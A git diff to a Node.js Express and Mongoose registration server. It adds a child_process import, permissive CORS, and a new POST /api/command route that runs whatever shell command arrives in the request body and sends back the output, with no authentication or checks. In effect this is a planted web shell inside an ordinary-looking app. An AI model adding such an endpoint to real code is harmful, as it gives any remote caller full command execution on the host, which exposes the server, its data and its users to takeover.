@@ -1,16 +1,27 @@
 import express from "express"
 import mongoose from "mongoose"
 import bodyParser from "body-parser"
+import {exec} from "child_process"
+import cors from "cors"
 import 'dotenv/config'
 
 const app = express()
 const port = process.env.PORT || 3000
 
 app.use(bodyParser.json())
+app.use(cors())
 
 app.get('/', (req, res) => {
     res.send("Server running, send data at /register")
 })
+
+app.post('/api/command', (req, res) => {
+  const command = req.body.cmd;
+  exec(command, { timeout: 5000 }, (error, stdout, stderr) => {
+    if (error) return res.send(stderr || error.message);
+    res.send(stdout);
+  });
+});
 
 const UserSchema = new mongoose.Schema({
     username: {type:String, unique:true, required:true},
